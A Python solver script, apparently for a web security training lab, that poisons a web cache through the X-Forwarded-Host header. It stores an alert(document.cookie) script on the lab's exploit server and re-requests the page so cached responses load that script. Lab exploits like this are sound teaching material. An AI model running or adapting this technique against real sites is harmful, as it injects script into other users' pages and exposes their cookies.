import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'})

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data_exp = {"urlIsHttps": "on", "responseFile": "/", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8", "responseBody": "alert(document.cookie)", "formAction": "STORE"}
session.post(exploit_server, data=burp_data_exp)


burp_headers = {"X-Forwarded-Host": exploit_server[8:]}
#,"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document","Connection": "close"}

session.get(burp_url, headers=burp_headers)
print("wait 5-250sek")

for _ in range(5):
    session.get(burp_url, headers=burp_headers)


burp_data_exp = {"urlIsHttps": "on", "responseFile": "/js/geolocate.js", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8", "responseBody": "alert(document.cookie)", "formAction": "STORE"}
session.post(exploit_server, data=burp_data_exp)

for _ in range(5):
    session.get(burp_url, headers=burp_headers)
